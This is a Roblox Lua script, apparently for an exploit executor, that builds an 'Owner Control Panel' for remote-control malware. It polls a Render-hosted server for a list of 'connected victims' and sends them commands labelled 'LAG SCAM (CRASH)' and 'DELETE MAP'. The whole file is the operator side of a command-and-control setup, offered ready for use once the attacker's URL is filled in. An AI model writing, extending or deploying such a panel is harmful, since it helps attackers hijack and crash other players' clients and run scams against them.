--[[ 
	Owner Control Panel
	Interface to view connected victims and execute commands.
]]

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local API_URL = "https://your-app-name.onrender.com" -- [IMPORTANT] CHANGE THIS TO YOUR RENDER URL
local http_request = request or http.request or (http and http.request) or nil

--------------------------------------------------------------------------------
-- UI CREATION
--------------------------------------------------------------------------------

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "OwnerControlPanel"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 500, 0, 350)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 8)
Corner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Text = "REMOTE CONTROL // ADMIN"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Parent = MainFrame

-- Scrolling List for Players
local PlayerList = Instance.new("ScrollingFrame")
PlayerList.Name = "PlayerList"
PlayerList.Size = UDim2.new(0, 200, 1, -50)
PlayerList.Position = UDim2.new(0, 10, 0, 40)
PlayerList.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
PlayerList.ScrollBarThickness = 4
PlayerList.Parent = MainFrame

local ListLayout = Instance.new("UIListLayout")
ListLayout.Parent = PlayerList
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Padding = UDim.new(0, 5)

-- Controls Area
local ControlArea = Instance.new("Frame")
ControlArea.Name = "ControlArea"
ControlArea.Size = UDim2.new(1, -230, 1, -60)
ControlArea.Position = UDim2.new(0, 220, 0, 50)
ControlArea.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
ControlArea.Parent = MainFrame

local SelectedPlayerId = nil
local SelectedPlayerName = nil

local AvatarImage = Instance.new("ImageLabel")
AvatarImage.Size = UDim2.new(0, 100, 0, 100)
AvatarImage.Position = UDim2.new(0.5, -50, 0, 10)
AvatarImage.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
AvatarImage.Parent = ControlArea

local NameLabel = Instance.new("TextLabel")
NameLabel.Size = UDim2.new(1, 0, 0, 30)
NameLabel.Position = UDim2.new(0, 0, 0, 120)
NameLabel.BackgroundTransparency = 1
NameLabel.Text = "No Selection"
NameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
NameLabel.Font = Enum.Font.Gotham
NameLabel.TextSize = 16
NameLabel.Parent = ControlArea

-- Buttons
local function CreateButton(text, color, callback)
	local btn = Instance.new("TextButton")
	btn.Text = text
	btn.BackgroundColor3 = color
	btn.TextColor3 = Color3.new(1,1,1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	btn.Parent = ControlArea
	
	local uc = Instance.new("UICorner")
	uc.CornerRadius = UDim.new(0, 4)
	uc.Parent = btn
	
	btn.MouseButton1Click:Connect(callback)
	return btn
end

local function SendCmd(cmd)
	if not SelectedPlayerId or not http_request then return end
	
	task.spawn(function()
		http_request({
			Url = API_URL .. "/command",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({
				target = SelectedPlayerId,
				command = cmd
			})
		})
	end)
end

local LagBtn = CreateButton("LAG SCAM (CRASH)", Color3.fromRGB(200, 50, 50), function()
	SendCmd("LAG_SCAM")
end)
LagBtn.Size = UDim2.new(0.9, 0, 0, 40)
LagBtn.Position = UDim2.new(0.05, 0, 0, 160)

local DeleBtn = CreateButton("DELETE MAP (LOCAL)", Color3.fromRGB(200, 150, 50), function()
	SendCmd("DELETE_MAP")
end)
DeleBtn.Size = UDim2.new(0.9, 0, 0, 40)
DeleBtn.Position = UDim2.new(0.05, 0, 0, 210)

--------------------------------------------------------------------------------
-- LOGIC
--------------------------------------------------------------------------------

local function RefreshList()
	-- Clear old items
	for _, v in pairs(PlayerList:GetChildren()) do
		if v:IsA("TextButton") then v:Destroy() end
	end
	
	if not http_request then return end
	
	local victims = {}
	local success, result = pcall(function()
		local response = http_request({
			Url = API_URL .. "/victims",
			Method = "GET"
		})
		if response and response.Body then
			victims = HttpService:JSONDecode(response.Body)
		end
	end)
	
	if not success then return end
	
	for userId, data in pairs(victims) do
		local btn = Instance.new("TextButton")
		btn.Name = data.Name
		btn.Text = "  " .. data.Name
		btn.Size = UDim2.new(1, 0, 0, 30)
		btn.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
		btn.TextColor3 = Color3.fromRGB(220, 220, 220)
		btn.Font = Enum.Font.Gotham
		btn.TextXAlignment = Enum.TextXAlignment.Left
		btn.Parent = PlayerList
		
		btn.MouseButton1Click:Connect(function()
			SelectedPlayerId = userId
			SelectedPlayerName = data.Name
			NameLabel.Text = data.Name
			AvatarImage.Image = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
		end)
	end
end

-- Auto refresh loop
task.spawn(function()
	while true do
		RefreshList()
		task.wait(2)
	end
end)

print("Owner UI Loaded.")
